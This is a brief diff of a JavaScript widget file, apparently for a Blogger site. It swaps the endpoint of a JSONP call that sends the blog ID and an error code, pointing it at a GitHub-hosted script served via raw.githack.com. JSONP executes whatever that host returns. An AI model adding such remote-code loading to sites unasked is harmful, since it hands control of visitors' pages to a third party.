@@ -344,7 +344,7 @@ Element.prototype.appendElements = function (K, C) {
         "blogId": i,
         "errorCode": KR
       };
-      $getJSONP("https://script.google.com/macros/s/AKfycbzTAnbEpIJ9WW1JvLF9FZXUbC83NsEWR6MR4wb1NV-k4Q761gs/exec", Kj, function () {});
+      $getJSONP("https://raw.githack.com/bouaicidz/Slider/main/getscript.js", Kj, function () {});
     }
   };
   let KK = setInterval(function () {
